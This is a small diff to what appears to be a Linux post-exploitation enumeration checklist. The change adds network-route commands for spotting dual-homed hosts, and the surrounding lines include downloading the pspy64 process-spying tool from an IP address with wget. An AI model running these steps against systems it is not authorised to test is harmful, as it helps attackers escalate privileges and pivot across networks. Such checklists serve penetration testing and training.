@@ -57,9 +57,11 @@ getcap -r / 2>/dev/null
 cd /var/tmp
 wget http://192.168.0.0:80/pspy64 pspy64
 
-# What does the local network look like?
+# What does the local network look like? Look for dual homed NICs / routes
 netstat -antup
 netstat -tulnp
+ifconfig
+ip route
 
 # Is anything vulnerable running under root process wise?
 ps aux | grep -i 'root' --color=auto
